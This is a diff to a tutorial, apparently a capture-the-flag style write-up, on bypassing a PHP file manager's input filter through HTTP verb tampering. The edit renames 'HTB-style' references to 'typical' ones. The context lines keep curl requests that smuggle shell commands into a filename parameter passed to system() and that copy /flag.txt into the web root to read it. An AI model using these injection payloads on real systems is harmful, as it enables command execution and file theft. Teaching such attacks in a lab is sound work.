@@ -209,7 +209,7 @@ $ curl 'http://target/create.php?filename=file;%20touch%20pwn'
 
 The PHP filter looks at `$_POST['filename']` (empty), regex passes, `$_REQUEST['filename']` (which sees the GET parameter) flows into `system()` - command injection achieved.
 
-For HTB-style scenarios that want both a benign file and an injected command:
+For typical scenarios that want both a benign file and an injected command:
 
 ```
 filename=file;%20cp%20/flag.txt%20./
@@ -243,7 +243,7 @@ The pattern generalizes to non-verb-based source confusion too - cookie-based ov
 
 ## A combined-pattern walkthrough
 
-The HTB-style scenario combines both patterns and is worth tracing.
+The typical scenario combines both patterns and is worth tracing.
 
 The app is a File Manager with two protected operations:
 
@@ -279,7 +279,7 @@ $ curl 'http://target/create.php?filename=file;%20touch%20pwn'
 $ curl 'http://target/create.php?filename=file;%20cp%20/flag.txt%20./'
 # Flag now in web root, fetch it
 $ curl http://target/flag.txt
-HTB{...}
+FLAG{...}
 ```
 
 Two different verb-tampering bugs in one app. Each enables a separate primitive; chained, they yield arbitrary file read.
